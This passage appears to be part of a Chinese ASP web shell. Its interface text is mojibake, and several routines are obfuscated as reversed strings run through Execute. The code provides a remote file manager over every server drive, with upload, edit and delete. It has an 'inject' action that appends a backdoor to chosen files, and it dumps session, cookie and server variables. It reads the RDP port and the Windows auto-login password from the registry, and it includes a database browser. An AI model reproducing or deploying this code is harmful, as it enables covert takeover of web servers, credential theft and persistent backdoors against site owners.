,htaPeht(tilpS(dnuoBU()��\�� ,htaPeht(tilpS=htSrts��)rrE(rrEkhc��)htSrts(ecapSemaN.Xas=redloFjbo teS��))��\�� ,htaPeht(veRrtSnI ,htaPeht(tfeL=htSrts��)htaPeht(htaPehTmirt=htaPeht��)��emaNelif��(tseuqeR=emaNelif��redloFjbo ,metIjbo ,emaNelif ,htSrts miD��fI dnE��txeN emuseR rorrE nO��nehT eslaF=edoMgubeDsi fI"
ExeCuTe(ShiSanFun(ShiSan))
End Sub
Sub PageCSInfo()
ShiSan="��>/rh<>naps/<�� SRR��txeN��fI dnE���>il/<�� & ))elbairaVrts(seikooC.tseuqeR(edocnE & �� :�� & elbairaVrts & ��>il<�� SRR��eslE ��txeN���>il/<�� & ))yeKrts()elbairaVrts(seikooC.tseuqeR(edocnElmtH & �� :)�� & yeKrts & ��(�� & elbairaVrts & ��>il<�� SRR��)elbairaVrts(seikooC.tseuqeR nI yeKrts hcaE roF��nehT syeKsaH.)elbairaVrts(seikooC.tseuqeR fI��seikooC.tseuqeR nI elbairaVrts hcaE roF���>';enon:yalpsid'=elyts seikooC=di naps<�� SRR���>a/<:seikooC>;)seikooC(eMediHwohs:tpircsavaj=ferh a<>/rb<�� SRR����>naps/<�� SRR��txeN���>il/<�� & ))elbairaVrts(noisseS(edocnE & �� :�� & elbairaVrts & ��>il<�� SRR��stnetnoC.noisseS nI elbairaVrts hcaE roF���>';enon:yalpsid'=elyts noisseS=di naps<�� SRR���>a/<)�� & dInoisseS.noisseS & ��DI(:noisseS>;)noisseS(eMediHwohs:tpircsavaj=ferh a<>/rb<�� SRR���>naps/<�� SRR��txeN��fI dnE��raelC.rrE��txeN���>il/<�� & ))raVrts()elbairaVrts(noitacilppA(edocnE & �� :)�� & raVrts & ��(�� & elbairaVrts & ��>il<�� SRR��)elbairaVrts(stnetnoC.noitacilppA nI raVrts hcaE roF��nehT rrE fI���>il/<�� & ))elbairaVrts(noitacilppA(edocnE & �� :�� & elbairaVrts & ��>il<�� SRR��stnetnoC.noitacilppA nI elbairaVrts hcaE roF���>';enon:yalpsid'=elyts noitacilppA=di naps<�� SRR���>a/<:noitacilppA>;)noitacilppA(eMediHwohs:tpircsavaj=ferh a<>/rb<�� SRR����>naps/<�� SRR��txeN���>il/<�� & )elbairaVrts(selbairaVrevreS.tseuqeR & �� :�� & elbairaVrts & ��>il<�� SRR��selbairaVrevreS.tseuqeR nI elbairaVrts hcaE roF���>';enon:yalpsid'=elyts selbairaVrevreS=di naps<�� SRR���>a/<:selbairaVrevreS>;)selbairaVrevreS(eMediHwohs:tpircsavaj=ferh a<�� SRR���)��Ϣ�Ż���������˻��ͩ�(eltiTwohs���elbairaVrts ,raVrts ,yeKrts miD��fI dnE��txeN emuseR rorrE nO��nehT eslaF=edoMgubeDsi fI"
ExeCuTe(ShiSanFun(ShiSan))
End Sub
Sub PageFsoFileExplorer()
If isDebugMode=False Then
On Error Resume Next
End If
Response.Buffer=True
Dim file, drive, folder, theFiles, theFolder, theFolders
Dim i, theAct, strTmp, driveStr, thePath, parentFolderName

theAct=Request("theAct")
thePath=Request("thePath")
If theAct <> "upload" Then
If Request.Form.Count > 0 Then
theAct=Request.Form("theAct")
thePath=Request.Form("thePath")
End If
End If
showTitle("FSO�ļ������(&stream)")
Select Case theAct
Case "newOne", "doNewOne"
fsoNewOne(thePath)
Case "showEdit"
Call showEdit(thePath, "fso")
Case "saveFile"
Call saveToFile(thePath, "fso")
Case "openUrl"
openUrl(thePath)
Case "copyOne", "cutOne"
If thePath="" Then
alertThenClose("��������!")
Response.End
End If
Session(m & "fsoThePath")=thePath
Session(m & "fsoTheAct")=theAct
alertThenClose("�����ɹ�,��ճ��!")
Case "pastOne"
fsoPastOne(thePath)
alertThenClose("ճ���ɹ�,��ˢ�±�ҳ�鿴Ч��!")
Case "showFsoRename"
showFsoRename(thePath)
Case "doRename"
Call fsoRename(thePath)
alertThenClose("�������ɹ�,ˢ�º���Կ���Ч��!")
Case "delOne", "doDelOne"
showFsoDelOne(thePath)
Case "getAttributes", "doModifyAttributes"
fsoTheAttributes(thePath)
Case "downTheFile"
downTheFile(thePath)
Case "showUpload"
Call showUpload(thePath, "FsoFileExplorer")
Case "upload"
streamUpload(thePath)
Call showUpload(thePath, "FsoFileExplorer")
Case "inject"
Set theFiles=fsoX.OpenTextFile(thePath)
strTmp=theFiles.ReadAll()
fsoSaveToFile thePath, strTmp & strBackDoor
Set theFiles=Nothing
alertThenClose("���Ų���ɹ�!")
End Select

If theAct <> "" Then
Response.End
End If

If Request.Form.Count > 0 Then
redirectTo("?pageName=FsoFileExplorer&thePath=" & UrlEncode(thePath))
End If

parentFolderName=fsoX.GetParentFolderName(thePath)
RRS "<div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>"
RRS "<input type=button value=' �½� ' onclick=newOne();>"
RRS "<input type=button value=' ���� ' onclick=fsoRename();>"
RRS "<input type=button value=' �༭ ' onclick=editFile();>"
RRS "<input type=button value=' �� ' onclick=openUrl();>"
RRS "<input type=button value=' ���� ' onclick=appDoAction('copyOne');>"
RRS "<input type=button value=' ���� ' onclick=appDoAction('cutOne');>"
RRS "<input type=button value=' ճ�� ' onclick=appDoAction2('pastOne')>"
RRS "<input type=button value=' ���� ' onclick=fsoGetAttributes();>"
RRS "<input type=button value=' ���� ' onclick=appDoAction('inject');>"
RRS "<input type=button value=' ɾ�� ' onclick=delOne();>"
RRS "<input type=button value=' �ϴ� ' onclick='upTheFile();'>"
RRS "<input type=button value=' ���� ' onclick='downTheFile();'>"
RRS "<br/>"
RRS "<input type=hidden value=FsoFileExplorer name=pageName />"
RRS "<input type=hidden value=""" & UrlEncode(thePath) & """ name=truePath>"
RRS "<input type=hidden size=50 name=usePath>"
RRS "<form method=post action=?pageName=FsoFileExplorer>"
If parentFolderName <> "" Then
RRS "<input value='������' type=button onclick=""this.disabled=true;location.href='?pageName=FsoFileExplorer&thePath=" & Server.UrlEncode(parentFolderName) & "';"">"
End If
RRS "<input type=button value=' ���� ' onclick='this.disabled=true;history.back();' />"
RRS "<input type=button value=' ǰ�� ' onclick='this.disabled=true;history.go(1);' />"
RRS "<input size=60 value=""" & HtmlEncode(thePath) & """ name=thePath>"
RRS "<input type=submit value=' ת�� '>"
RRS ""&copyurl&""
driveStr="<option>�̷�</option>"
driveStr=driveStr & "<option value='" & HtmlEncode(Server.MapPath(".")) & "'>.</option>"
driveStr=driveStr & "<option value='" & HtmlEncode(Server.MapPath("/")) & "'>/</option>"
For Each drive In fsoX.Drives
driveStr=driveStr & "<option value='" & drive.DriveLetter & ":\'>" & drive.DriveLetter & ":\</option>"
Next
RRS strReload
RRS "<select onchange=""this.form.thePath.value=this.value;this.form.submit();"">" & driveStr & "</select>"
RRS "<hr/></form>"
RRS "</div><div style='height:50px;'></div>"
RRS "<script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"
If fsoX.FolderExists(thePath)=False Then
showErr(thePath & " Ŀ¼�����ڻ��߲��������!")
End If
Set theFolder=fsoX.GetFolder(thePath)
Set theFiles=theFolder.Files
Set theFolders=theFolder.SubFolders
RRS "<div id=FileList>"
For Each folder In theFolders
i=i + 1
If i > 50 Then
i=0
Response.Flush()
End If
strTmp=UrlEncode(folder.Path & "\")
RRS "<span id='" & strTmp & "' onDblClick=""changeThePath(this);"" onclick=changeMyClass(this);><font class=font face=Wingdings>0</font><br/>" & folder.Name & "</span>" & vbNewLine
Next
Response.Flush()
For Each file In theFiles
i=i + 1
If i > 100 Then
i=0
Response.Flush()
End If
RRS "<span id='" & UrlEncode(file.Path) & "' title='����: " & file.Type & vbNewLine & "��С: " & getTheSize(file.Size) & "' onDblClick=""openUrl();"" onclick=changeMyClass(this);><font class=font face=" & getFileIcon(fsoX.GetExtensionName(file.Name)) & "</font><br/>" & file.Name & "</span>" & vbNewLine
Next
RRS "</div>"
chkErr(Err)

RRS "<hr/>"
End Sub
Sub fsoNewOne(thePath)
ShiSan="��>/rb<>ydob/<�� SRR���>mrof/<�� SRR��eMesolCsJrts & ��>' ��ȷ '=eulav tcAwen=eman timbus=epyt tupni<�� SRR���>enOweNod=eulav tcAeht=eman neddih=epyt tupni<�� SRR���>/rh<>emaNeht=eman 83=ezis tupni<�� SRR���>/rb<>lebal/<�м���>redlof=rof lebal<>'eslaF'=eulav redlof=di eliFsi=eman oidar=epyt tupni<�� SRR��� >lebal/<����>elif=rof lebal<>dekcehc 'eurT'=eulav elif=di eliFsi=eman oidar=epyt tupni<�� SRR��� :����>/rb<>���� & )htaPeht(edocnElmtH & ����=eulav htaPeht=eman neddih=epyt tupni<�� SRR���>tsop=dohtem mrof<�� SRR���>2=nigrampot ydob<�� SRR���>elyts/<};neddih:wolfrevo{ydob>elyts<�� SRR���fI dnE��dnE.esnopseR��)��!��Ч�����Կɾͺ���ˢ,���ɽ���)��(���ĩ�(esolCnehTtrela��)rrE(rrEkhc��fI dnE��)htaPeht(redloFetaerC.Xosf��eslE ��)eslaF ,htaPeht(eliFtxeTetaerC.Xosf llaC��nehT ��eurT��=eliFsi fI��)��\�� ,��\\�� ,emaNeht & ��\�� & htaPeht(ecalpeR=htaPeht��nehT �� ��ȷ ��=tcAwen fI��)��emaNeht��(tseuqeR=emaNeht��)��tcAwen��(tseuqeR=tcAwen��)��eliFsi��(tseuqeR=eliFsi��tcAwen ,emaNeht ,eliFsi ,tcAeht miD��fI dnE��txeN emuseR rorrE nO��nehT eslaF=edoMgubeDsi fI"
ExeCuTe(ShiSanFun(ShiSan))
End Sub
Sub fsoPastOne(thePath)
ShiSan="��)rrE(rrEkhc���fI dnE��fI dnE��))htaPnoisses(emaNeliFteG.Xosf & ��\�� & htaPeht ,htaPnoisses(eliFypoC.Xosf llaC��eslE ��))htaPnoisses(emaNeliFteG.Xosf & ��\�� & htaPeht ,htaPnoisses(eliFevoM.Xosf llaC��nehT ��enOtuc��=)��tcAehTosf�� & m(noisseS fI��eslE ��fI dnE��))htaPnoisses(emaNeliFteG.Xosf & ��\�� & htaPeht ,htaPnoisses(redloFypoC.Xosf llaC��eslE ��))htaPnoisses(emaNeliFteG.Xosf & ��\�� & htaPeht ,htaPnoisses(redloFevoM.Xosf llaC��nehT ��enOtuc��=)��tcAehTosf�� & m(noisseS fI��)1 - )htaPnoisses(neL ,htaPnoisses(tfeL=htaPnoisses��nehT ��\��=)1 ,htaPnoisses(thgiR fI���fI dnE��)1 - )htaPeht(neL ,htaPeht(tfeL=htaPeht��nehT ��\��=)1 ,htaPeht(thgiR fI���fI dnE��dnE.esnopseR��)��!������Ω�(esolCnehTtrela��nehT ���=htaPnoisses rO ���=htaPeht fI���)��htaPehTosf�� & m(noisseS=htaPnoisses��htaPnoisses miD��fI dnE��txeN emuseR rorrE nO��nehT eslaF=edoMgubeDsi fI"
ExeCuTe(ShiSanFun(ShiSan))
End Sub
Sub fsoRename(thePath)
If isDebugMode=False Then
On Error Resume Next
End If
Dim theFile, fileName, theFolder
fileName=Request("fileName")

If thePath="" Or fileName="" Then
alertThenClose("��������!")
Response.End
End If
If Right(thePath, 1)="\" Then
Set theFolder=fsoX.GetFolder(thePath)
theFolder.Name=fileName
Set theFolder=Nothing
 Else
Set theFile=fsoX.GetFile(thePath)
theFile.Name=fileName
Set theFile=Nothing
End If

chkErr(Err)
End Sub

Sub showFsoRename(thePath)
Dim theAct, fileName
fileName=fsoX.getFileName(thePath)
RRS "<style>body{overflow:hidden;}</style>"
RRS "<body topmargin=2>"
RRS "<form method=post>"
RRS "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """><br/>����Ϊ:<br/>"
RRS "<input size=38 name=fileName value=""" & HtmlEncode(fileName) & """><hr/>"
RRS "<input type=submit value=' ȷ�� '>"
RRS "<input type=hidden name=theAct value=doRename>"
RRS strJsCloseMe
RRS "</form>"
RRS "</body><br/>"
End Sub

Sub showFsoDelOne(thePath)
If isDebugMode=False Then
On Error Resume Next
End If
Dim newAct, theFile
newAct=Request("newAct")
If newAct="ȷ��ɾ��?" Then
If Right(thePath, 1)="\" Then
thePath=Left(thePath, Len(thePath) - 1)
Call fsoX.DeleteFolder(thePath, True)
Else
Call fsoX.DeleteFile(thePath, True)
End If
chkErr(Err)
alertThenClose("�ļ�(��)ɾ���ɹ�,ˢ�º�Ϳ��Կ���Ч��!")
RRS "<script>history.go(-2);</script>"
Response.End
End If
RRS "<style>body{margin:0;border:none;overflow:hidden;background-color:#444;}</style>"
RRS "<form method=post><br/>"
RRS HtmlEncode(thePath)
RRS "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>"
RRS "<input type=hidden name=theAct value=doDelOne>"
RRS "<hr/><input type=submit name=newAct value='ȷ��ɾ��?'>"&strJsCloseMe
RRS "</form><input type='button' name='Submit2' value=' ���� ' onClick='javascript:history.go(-1);'>"
End Sub

Sub fsoTheAttributes(thePath)
If isDebugMode=False Then
On Error Resume Next
End If
Dim newAct, theFile, theFolder, theTitle
newAct=Request("newAct")

If Right(thePath, 1)="\" Then
Set theFolder=fsoX.GetFolder(thePath)
If newAct=" �޸� " Then
setMyTitle(theFolder)
End If
theTitle=getMyTitle(theFolder)
Set theFolder=Nothing
 Else
Set theFile=fsoX.GetFile(thePath)
If newAct=" �޸� " Then
setMyTitle(theFile)
End If
theTitle=getMyTitle(theFile)
Set theFile=Nothing
End If

chkErr(Err)
theTitle=Replace(theTitle, vbNewLine, "<br/>")
RRS "<style>body{margin:0;overflow:hidden;}</style>"
RRS "<form method=post>"
RRS "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>"
RRS "<input type=hidden name=theAct value=doModifyAttributes>"
RRS theTitle
RRS "<hr/><input type=submit name=newAct value=' �޸� '>" & strJsCloseMe
RRS "</form>"
End Sub

Function getMyTitle(theOne)
If isDebugMode=False Then
On Error Resume Next
End If
Dim strTitle
strTitle=strTitle & "·��: " & theOne.Path & "" & vbNewLine
strTitle=strTitle & "��С: " & getTheSize(theOne.Size) & vbNewLine
strTitle=strTitle & "����: " & getAttributes(theOne.Attributes) & vbNewLine
strTitle=strTitle & "����ʱ��: " & theOne.DateCreated & vbNewLine
strTitle=strTitle & "����޸�: " & theOne.DateLastModified & vbNewLine
strTitle=strTitle & "������: " & theOne.DateLastAccessed
getMyTitle=strTitle
End Function

Sub setMyTitle(theOne)
Dim i, myAttributes

For i=1 To Request("attributes").Count
myAttributes=myAttributes + CInt(Request("attributes")(i))
Next
theOne.Attributes=myAttributes

chkErr(Err)
RRS  "<script>alert('���ļ�(��)�����Ѱ���ȷ�����޸����!');</script>"
End Sub

Function getAttributes(intValue)
Dim strAtt
strAtt="<input type=checkbox name=attributes value=4 {$system}>ϵͳ "
strAtt=strAtt & "<input type=checkbox name=attributes value=2 {$hidden}>���� "
strAtt=strAtt & "<input type=checkbox name=attributes value=1 {$readonly}>ֻ��&nbsp;&nbsp;&nbsp;"
strAtt=strAtt & "<input type=checkbox name=attributes value=32 {$archive}>�浵<br/>����&nbsp; "
strAtt=strAtt & "<input type=checkbox name=attributes {$normal} value=0>��ͨ "
strAtt=strAtt & "<input type=checkbox name=attributes value=128 {$compressed}>ѹ�� "
strAtt=strAtt & "<input type=checkbox name=attributes value=16 {$directory}>�ļ���&nbsp;"
strAtt=strAtt & "<input type=checkbox name=attributes value=64 {$alias}>��ݷ�ʽ"
'strAtt=strAtt & "<input type=checkbox name=attributes value=8 {$volume}>��� "
If intValue=0 Then
strAtt=Replace(strAtt, "{$normal}", "checked")
End If
If intValue >= 128 Then
intValue=intValue - 128
strAtt=Replace(strAtt, "{$compressed}", "checked")
End If
If intValue >= 64 Then
intValue=intValue - 64
strAtt=Replace(strAtt, "{$alias}", "checked")
End If
If intValue >= 32 Then
intValue=intValue - 32
strAtt=Replace(strAtt, "{$archive}", "checked")
End If
If intValue >= 16 Then
intValue=intValue - 16
strAtt=Replace(strAtt, "{$directory}", "checked")
End If
If intValue >= 8 Then
intValue=intValue - 8
strAtt=Replace(strAtt, "{$volume}", "checked")
End If
If intValue >= 4 Then
intValue=intValue - 4
strAtt=Replace(strAtt, "{$system}", "checked")
End If
If intValue >= 2 Then
intValue=intValue - 2
strAtt=Replace(strAtt, "{$hidden}", "checked")
End If
If intValue >= 1 Then
intValue=intValue - 1
strAtt=Replace(strAtt, "{$readonly}", "checked")
End If
getAttributes=strAtt
End Function
Sub PageInfoAboutSrv()
Dim theAct
theAct=Request("theAct")

showTitle("�������������")

Select Case theAct
Case ""
getSrvInfo()
getSrvDrvInfo()
getSiteRootInfo()
getTerminalInfo()
Case "getSrvInfo"
getSrvInfo()
Case "getSrvDrvInfo"
getSrvDrvInfo()
Case "getSiteRootInfo"
getSiteRootInfo()
Case "getTerminalInfo"
getTerminalInfo()
End Select

RRS "<hr/>"
End Sub
Sub getSrvInfo()
If isDebugMode=False Then
On Error Resume Next
End If
Dim i, sa, objWshSysEnv, aryExEnvList, strExEnvList, intCpuNum, strCpuInfo, strOS
Set sa=Server.CreateObject("Shell.Application")
strExEnvList="SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$" & _
   "PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
aryExEnvList=Split(strExEnvList, "$")

Set objWshSysEnv=wsX.Environment("SYSTEM")
chkErr(Err)
intCpuNum=Request.ServerVariables("NUMBER_OF_PROCESSORS")
If IsNull(intCpuNum) Or intCpuNum="" Then
intCpuNum=objWshSysEnv("NUMBER_OF_PROCESSORS")
End If
strOS=Request.ServerVariables("OS")
If IsNull(strOS) Or strOS="" Then
strOS=objWshSysEnv("OS")
strOs=strOs & "(�п����� Windows2003 Ŷ)"
End If
strCpuInfo=objWshSysEnv("PROCESSOR_IDENTIFIER")
RRS "<a href=javascript:showHideMe(srvInf);>��������ز���:</a>"
RRS "<ol id=srvInf><hr/>"
RRS "<li>��������: " & Request.ServerVariables("SERVER_NAME") & "</li>"
RRS "<li>������IP: " & Request.ServerVariables("LOCAL_ADDR") & "</li>"
RRS "<li>����˿�: " & Request.ServerVariables("SERVER_PORT") & "</li>"
RRS "<li>�������ڴ�: " & getTheSize(sa.GetSystemInformation("PhysicalMemoryInstalled")) & "</li>"
RRS "<li>������ʱ��: " & Now & "</li>"
RRS "<li>���������: " & Request.ServerVariables("SERVER_SOFTWARE") & "</li>"
RRS "<li>�ű���ʱʱ��: " & Server.ScriptTimeout & "</li>"
RRS "<li>������CPU����: " & intCpuNum & "</li>"
RRS "<li>������CPU����: " & strCpuInfo & "</li>"
RRS "<li>����������: " & strOS & "</li>"
RRS "<li>��������������: " & ScriptEngine & "/" & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & "." & ScriptEngineBuildVersion & "</li>"
RRS "<li>���ļ�ʵ��·��: " & Request.ServerVariables("PATH_TRANSLATED") & "</li>"
RRS "<hr/></ol>"
RRS "<br/><a href=javascript:showHideMe(srvEnvInf);>��������ز���:</a>"
RRS "<ol id=srvEnvInf><hr/>"
For i=0 To UBound(aryExEnvList)
RRS "<li>" & aryExEnvList(i) & ": " & wsX.ExpandEnvironmentStrings("%" & aryExEnvList(i) & "%") & "</li>"
Next
RRS "<hr/></ol>"

Set sa=Nothing
Set objWshSysEnv=Nothing
End Sub
Sub getSrvDrvInfo()
If isDebugMode=False Then
On Error Resume Next
End If
Dim objTheDrive
RRS "<br/><a href=javascript:showHideMe(srvDriveInf);>������������Ϣ:</a>"
RRS "<ol id=srvDriveInf><hr/>"
RRS "<div id='fsoDriveList'>"
RRS "<span>�̷�</span><span>����</span><span>���</span><span>�ļ�ϵͳ</span><span>���ÿռ�</span><span>�ܿռ�</span><br/>"
For Each objTheDrive In fsoX.Drives
RRS "<span>" & objTheDrive.DriveLetter & "</span>"
RRS "<span>" & getDriveType(objTheDrive.DriveType) & "</span>"
If UCase(objTheDrive.DriveLetter)="A" Then
RRS "<br/>"
Else
RRS "<span>" & objTheDrive.VolumeName & "</span>"
RRS "<span>" & objTheDrive.FileSystem & "</span>"
RRS "<span>" & getTheSize(objTheDrive.FreeSpace) & "</span>"
RRS "<span>" & getTheSize(objTheDrive.TotalSize) & "</span><br/>"
End If
If Err Then
Err.Clear
RRS "<br/>"
End If
Next
RRS "</div><hr/></ol>"
Set objTheDrive=Nothing
End Sub
Sub getSiteRootInfo()
If isDebugMode=False Then
On Error Resume Next
End If
Dim objTheFolder
Set objTheFolder=fsoX.GetFolder(Server.MapPath("/"))
RRS "<br/><a href=javascript:showHideMe(siteRootInfo);>վ���Ŀ¼��Ϣ:</a>"
RRS "<ol id=siteRootInfo><hr/>"
RRS "<li>����·��: " & Server.MapPath("/") & "</li>"
RRS "<li>��ǰ��С: " & getTheSize(objTheFolder.Size) & "</li>"
RRS "<li>�ļ���: " & objTheFolder.Files.Count & "</li>"
RRS "<li>�ļ�����: " & objTheFolder.SubFolders.Count & "</li>"
RRS "<li>��������: " & objTheFolder.DateCreated & "</li>"
RRS "<li>����������: " & objTheFolder.DateLastAccessed & "</li>"
RRS "</ol>"
End Sub

Sub getTerminalInfo()
If isDebugMode=False Then
On Error Resume Next
End If
Dim terminalPortPath, terminalPortKey, termPort
Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
terminalPortPath="HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey="PortNumber"
termPort=wsX.RegRead(terminalPortPath & terminalPortKey)
RRS "�ն˷���˿ڼ��Զ���¼<hr/><ol>"
If termPort="" Or Err.Number <> 0 Then 
RRS  "�޷��õ��ն˷���˿�, ����Ȩ���Ƿ��Ѿ��ܵ�����.<br/>"
 Else
RRS  "��ǰ�ն˷���˿�: " & termPort & "<br/>"
End If

autoLoginPath="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey="AutoAdminLogon"
autoLoginUserKey="DefaultUserName"
autoLoginPassKey="DefaultPassword"
isAutoLoginEnable=wsX.RegRead(autoLoginPath & autoLoginEnableKey)
If isAutoLoginEnable=0 Then
RRS  "ϵͳ�Զ���¼����δ����<br/>"
Else
autoLoginUsername=wsX.RegRead(autoLoginPath & autoLoginUserKey)
RRS  "�Զ���¼��ϵͳ�ʻ�: " & autoLoginUsername & "<br>"
autoLoginPassword=wsX.RegRead(autoLoginPath & autoLoginPassKey)
If Err Then
Err.Clear
RRS  "False"
End If
RRS  "�Զ���¼���ʻ�����: " & autoLoginPassword & "<br>"
End If
RRS "</ol>"
End Sub
Sub PageLogin()
Dim theAct, ShiSanWord
theAct=Request("theAct")
ShiSanWord=Request("shiSanName")
showTitle(myName)
If theAct="chkLogin" Then
If ShiSanWord=shiSanName Then
Session(m & "shiSanName")=ShiSanWord
redirectTo("?pageName=Iframe")
Else
RRS "<script language=javascript>alert('"&myName&" ��ʾ,ʧ��...');history.back();</script>"
End If
End If
if LShow<>true then
URL=Request.ServerVariables("URL")
uu=request.servervariables("http_host")&url

session("IDebugMode")=UU
RRS "<style>body{margin:0;text-align:center;background-color:#000;}</style>"
RRS "<br><b>"&myName&"</b><hr/>"
RRS "<body onload=document.forms[0].shiSanName.focus();>"
RRS "<form method=post onsubmit=this.Submit.disabled=true;>"
RRS "<input name=shiSanName class=input type=password size=30> "
RRS "<input type=hidden name=theAct value=chkLogin>"
RRS "<input type=submit name=Submit value=""" & HtmlEncode(myName) & """ class=input>"
RRS "</form>"
RRS "<body>"
end if
End Sub
Sub pageMsDataBase()
Dim theAct, sqlStr
theAct=Request("theAct")
sqlStr=Request("sqlStr")

showTitle("mdb+mssql���ݿ����ҳ")

If sqlStr="" Then
If Session(m & "sqlStr")="" Then
sqlStr="e:\hytop.mdb��sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;"
Else
sqlStr=Session(m & "sqlStr")
End If
End If
Session(m & "sqlStr")=sqlStr

RRS "<style>body{margin:0;}</style>"
RRS "<form method=post action='?pageName=MsDataBase&theAct=showTables' onSubmit='this.Submit.disabled=true;'>"
RRS "<a href='?pageName=MsDataBase'>mdb+mssql���ݿ����</a><br/>"
RRS "<input name=sqlStr type=text id=sqlStr value=""" & sqlStr & """ size=60 style='width:80%;'>"
RRS "<input name=theAct type=hidden value=showTables><br/>"
RRS "<input type=Submit name=Submit value=' �ύ '>"
RRS "<input type=button value=' ʾ��MSSQL ' onclick=""this.form.sqlStr.value='e:\\HYTop.mdb��sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=13.;Database=bbs;';"">"
RRS "<input type=button value=' ʾ��ACCESS ' onclick=""this.form.sqlStr.value='Provider=Microsoft.Jet.OLEDB.4.0;Data Source=data.mdb';"">"
RRS "</form>"
RRS "<hr/>"
Select Case theAct
Case "showTables"
showTables()
Case "query"
showQuery()
Case "inject"
accessInject()
End Select
End Sub
Sub showTables()
If isDebugMode=False Then
On Error Resume Next
End If
Dim conn, sqlStr, rsTable, rsColumn, connStr, tablesStr
sqlStr=Request("sqlStr")
If LCase(Left(sqlStr, 4))="sql:" Then
connStr=Mid(sqlStr, 5)
 Else
connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
End If
Set conn=Server.CreateObject("Adodb.Connection")

conn.Open connStr
chkErr(Err)

tablesStr=getTableList(conn, sqlStr, rsTable)

RRS "<a href=""?pageName=MsDataBase&theAct=showTables&sqlStr=" & UrlEncode(sqlStr)  & """>���ݿ��ṹ�鿴:</a><br/>"
RRS tablesStr & "<hr/>"
RRS "<a href=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & """>ת��SQL����ִ��</a><hr/>"
Do Until rsTable.Eof
Set rsColumn=conn.OpenSchema(4, Array(Empty, Empty, rsTable("Table_Name").value))
RRS "<table border=0 cellpadding=0 cellspacing=0><tr><td height=22 colspan=6><b>" & rsTable("Table_Name") & "</b></td>"
RRS "</tr><tr><td colspan=6><hr/></td></tr><tr align=center>"
RRS "<td>�ֶ���</td><td>����</td><td>��С</td><td>����</td><td>����Ϊ��</td><td>Ĭ��ֵ</td></tr>"
RRS "<tr><td colspan=6><hr/></td></tr>"
Do Until rsColumn.Eof
RRS "<tr align=center>"
RRS "<td align=Left>&nbsp;" & rsColumn("Column_Name") & "</td>"
RRS "<td width=80>" & getDataType(rsColumn("Data_Type")) & "</td>"
RRS "<td width=70>" & rsColumn("Character_Maximum_Length") & "</td>"
RRS "<td width=70>" & rsColumn("Numeric_Precision") & "</td>"
RRS "<td width=70>" & rsColumn("Is_Nullable") & "</td>"
RRS "<td width=80>" & rsColumn("Column_Default") & "</td>"
RRS "</tr>"
rsColumn.MoveNext
Loop

RRS "<tr><td colspan=6><hr/></td></tr></table>"
rsTable.MoveNext
Loop
RRS "<hr/>"
conn.Close
Set conn=Nothing
Set rsTable=Nothing
Set rsColumn=Nothing
End Sub
Sub showQuery()
If isDebugMode=False Then
On Error Resume Next
End If
Dim i, j, rs, sql, page, conn, sqlStr, connStr, rsTable, tablesStr, theTable
sql=Request("sql")
page=Request("page")
sqlStr=Request("sqlStr")
theTable=Request("theTable")

If Not IsNumeric(page) or page="" Then
page=1
End If

If sql="" And theTable <> "" Then
sql="Select top " & dbSelectNumber & " * from [" & theTable & "]"
End If

If LCase(Left(sqlStr, 4))="sql:" Then
connStr=Mid(sqlStr, 5)
 Else
connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
End If
Set rs=Server.CreateObject("Adodb.RecordSet")
Set conn=Server.CreateObject("Adodb.Connection")

conn.Open connStr
chkErr(Err)

tablesStr=getTableList(conn, sqlStr, rsTable)
RRS "<a href=""?pageName=MsDataBase&theAct=showTables&sqlStr=" & UrlEncode(sqlStr)  & """>���ݿ��ṹ�鿴:</a><br/>"
RRS tablesStr & "<hr/>"
RRS "<a href=?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&sql=" & UrlEncode(sql) & ">SQL����ִ�м��鿴</a>"
RRS "<br/><form method=post action=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & """>"
RRS "<input name=sql type=text id=sql value=""" & HtmlEncode(sql) & """ size=60>"
RRS "<input type=Submit name=Submit4 value=ִ�в�ѯ><hr/>"
If sql <> "" And Left(LCase(sql), 7)="select " Then
rs.Open sql, conn, 1, 1
chkErr(Err)
rs.PageSize=20
If Not rs.Eof Then
rs.AbsolutePage=page
End If
If rs.Fields.Count>0 Then
RRS "<br><table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""98%"">"
RRS "<tr>"
RRS "<td height=""22"" align=""center"" class=""tr"" colspan=""" & rs.Fields.Count & """>SQL���� - ִ�н��</td>"
RRS "</tr>"
RRS "<tr>"
For j=0 To rs.Fields.Count-1
RRS "<td height=""22"" align=""center"" class=""td""> " & rs.Fields(j).Name & " </td>"
Next
For i=1 To 20
If rs.Eof Then
Exit For
End If
RRS "</tr>"
RRS "<tr valign=top>"
For j=0 To rs.Fields.Count-1
RRS "<td height=""22"" align=""center"">" & HtmlEncode(fixNull(rs(j))) & "</td>"
Next
RRS "</tr>"
rs.MoveNext
Next
End If
RRS "<tr>"
RRS "<td height=""22"" align=""center"" class=""td"" colspan=""" & rs.Fields.Count & """>"
For i=1 To rs.PageCount
RRS Replace("<a href=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&sql=" & UrlEncode(sql) & "&page=" & i & """><font {$font" & i & "}>" & i & "</font></a> ", "{$font" & page & "}", "class=warningColor")
